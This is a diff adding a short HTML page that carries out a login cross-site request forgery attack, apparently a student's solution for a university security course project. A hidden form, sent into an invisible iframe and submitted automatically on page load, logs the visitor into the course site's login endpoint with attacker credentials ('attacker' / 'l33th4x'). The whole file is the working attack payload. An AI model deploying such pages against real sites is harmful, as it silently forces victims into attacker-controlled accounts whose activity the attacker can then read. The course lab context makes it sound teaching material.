@@ -1,0 +1,14 @@
+<!DOCTYPE html>
+<html lang=en>
+<script src="http://code.jquery.com/jquery-2.2.0.js"></script>
+<body>
+	<iframe name="myframe" style="width:0;height:0;border:0; border:none;"></iframe>
+
+	<form method="POST" action="https://ecen5032.org/project2/login?csrfdefense=0&xssdefense=4" target="myframe" onsubmit="onformsubmit()"><input id="username" type="hidden" name="username" value="attacker" /><input id="userpass" type="hidden" name="password" value="l33th4x" />
+	</form>
+	
+	<script>
+			document.forms[0].submit();
+	</script>
+</body>
+</html>
